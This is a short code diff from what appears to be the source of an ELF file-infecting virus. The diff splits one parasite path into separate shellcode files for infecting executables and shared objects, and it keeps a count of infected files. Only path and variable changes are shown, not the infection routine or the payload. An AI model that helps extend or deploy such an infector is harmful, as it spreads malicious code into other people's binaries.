@@ -32,7 +32,8 @@ Description : This program parses all the directories and subdirectories under t
 
 
 
-char *parasite_path;
+char *parasite_path_for_exec;
+char *parasite_path_for_so;
 
 
 int main(int argc, char *argv[])
@@ -46,9 +47,11 @@ int main(int argc, char *argv[])
 	}	
 
 	
-	// setting parasite_path to argv[2]
-	// parasite_path = argv[2];
-	parasite_path  = "./shellcode/parasite_code";
+	// Using different parasites (for LSB executable and LSB Shared object infection)
+	// parasite_path_for_exec = argv[2];
+	// parasite_path_for_so   = argv[3];
+	parasite_path_for_exec  = "./shellcode/exec_parasite.bin";
+	parasite_path_for_so	= "./shellcode/so_parasite.bin";
 	infected_count = 0;
 
 
